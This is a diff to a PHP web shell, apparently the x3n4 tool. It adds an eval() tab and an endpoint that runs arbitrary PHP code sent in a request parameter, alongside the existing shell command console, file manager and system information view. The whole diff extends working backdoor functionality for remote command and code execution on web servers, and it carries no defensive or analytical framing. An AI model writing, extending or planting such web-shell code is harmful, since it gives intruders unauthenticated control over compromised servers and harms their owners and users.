@@ -1,6 +1,6 @@
 <?php
 
-define('X3N4_VERSION', 'v0.1.4-alpha');
+define('X3N4_VERSION', 'v0.1.42-alpha');
 
 session_start();
 
@@ -28,6 +28,8 @@ function get_shell_command()
             $shell_command = 'proc_open';
         } elseif (is_callable('popen') && !is_function_disabled('popen')) {
             $shell_command = 'popen';
+        } else {
+            $shell_command = false;
         }
     }
 
@@ -162,6 +164,14 @@ if (isset($_REQUEST['cmd'])) {
     output_json($output);
 }
 
+if (isset($_REQUEST['eval'])) {
+    ob_start();
+    $output = @eval(stripslashes($_REQUEST['eval']));
+    $output .= ob_get_contents();
+    ob_end_clean();
+    output_json($output);
+}
+
 /**
  * HTML
  */
@@ -202,7 +212,8 @@ if (isset($_REQUEST['cmd'])) {
         <ul class="nav nav-tabs" role="tablist">
             <li role="presentation"><a href="#information" aria-controls="information" role="tab" data-toggle="tab"><i class="fa fa-info-circle"></i> System information</a></li>
             <li role="presentation" class="active"><a href="#console" aria-controls="console" role="tab" data-toggle="tab"><i class="fa fa-terminal"></i> Console</a></li>
-            <!-- <li role="presentation"><a href="#file-manager" aria-controls="file-manager" role="tab" data-toggle="tab"><i class="fa fa-file-code-o "></i> File manager</a></li> -->
+            <!-- <li role="presentation"><a href="#file-manager" aria-controls="file-manager" role="tab" data-toggle="tab"><i class="fa fa-file-code-o"></i> File manager</a></li> -->
+            <li role="presentation"><a href="#php-eval" aria-controls="php-eval" role="tab" data-toggle="tab"><i class="fa fa-code"></i> eval()</a></li>
         </ul>
         <p></p>
         <div class="tab-content">
@@ -266,7 +277,7 @@ if (isset($_REQUEST['cmd'])) {
                         <span class="input-group-addon hidden-xs" id="pwd"><?php echo get_shell_prefix(); ?></span>
                         <input type="text" id="stdin" class="form-control" />
                         <span class="input-group-btn">
-                            <button type="button" class="btn btn-default" id="btnExecCommand">Send</button>
+                            <button type="button" class="btn btn-default" id="btnExecCommand"><i class="fa fa-chevron-right"></i> Send</button>
                         </span>
                     </div>
                 </div>
@@ -274,6 +285,12 @@ if (isset($_REQUEST['cmd'])) {
 
             <div id="file-manager" role="tabpanel" class="tab-pane">
                 <?php list_folder_files(__DIR__); ?>
+            </div>
+
+            <div id="php-eval" role="tabpanel" class="tab-pane">
+                <textarea id="php-code" class="form-control">echo 'hello world';</textarea>
+                <button type="button" class="btn btn-default" id="btnEval"><i class="fa fa-play"></i> Run</button>
+                <pre id="php-stdout"></pre>
             </div>
         </div>
     </div>
@@ -305,9 +322,22 @@ if (isset($_REQUEST['cmd'])) {
                     $('#stdout').scrollTop($('#stdout')[0].scrollHeight);
                 });
             }
+            this.evalPhp = function(code) {
+                $.post(this.script_path, {eval: code}, function(data) {
+                    console.log(data);
+                    if (data.stdout) {
+                        $('#php-stdout').html(data.stdout);
+                    } else {
+                        $('#php-stdout').html(data);
+                    }
+                });
+            }
             this.clickExecCommand = function() {
                 window.x3n4.execCommand($('#stdin').val());
                 $('#stdin').val('');
+            }
+            this.clickEval = function() {
+                window.x3n4.evalPhp($('#php-code').val());
             }
             this.checkUpdate = function() {
                 $.get('https://api.github.com/repos/jorge-matricali/x3n4/releases', function(data) {
@@ -319,6 +349,7 @@ if (isset($_REQUEST['cmd'])) {
             }
             this.declareCallbacks = function() {
                 $('#btnExecCommand').on('click', this.clickExecCommand);
+                $('#btnEval').on('click', this.clickEval);
                 $('#stdin').on('keypress', function(ev) {
                     if ((ev.keyCode ? ev.keyCode : ev.which) == '13') {
                         $('#btnExecCommand').click()
